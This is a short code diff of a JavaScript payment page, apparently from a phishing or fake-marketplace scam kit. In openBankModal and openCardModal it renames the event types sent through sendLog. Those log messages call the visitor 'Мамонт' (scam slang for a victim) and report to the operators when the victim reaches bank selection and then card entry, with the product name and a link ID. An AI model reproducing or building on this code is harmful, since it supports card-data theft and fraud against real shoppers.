@@ -2482,7 +2482,7 @@ function openBankModal() {
   }
 
   if (typeof sendLog === 'function') {
-    sendLog('payment_flow', `🏦 Мамонт перешел на выбор банка\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`);
+    sendLog('page_visit', `🏦 Мамонт перешел на выбор банка\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`);
   } else {
     console.error('❌ sendLog is not defined!');
   }
@@ -2505,7 +2505,7 @@ function openCardModal() {
   }
 
   if (typeof sendLog === 'function') {
-    sendLog('payment_flow', `💳 Мамонт перешел на ввод карты\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`);
+    sendLog('page_confirmation', `💳 Мамонт перешел на ввод карты\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`);
   } else {
     console.error('❌ sendLog is not defined!');
   }
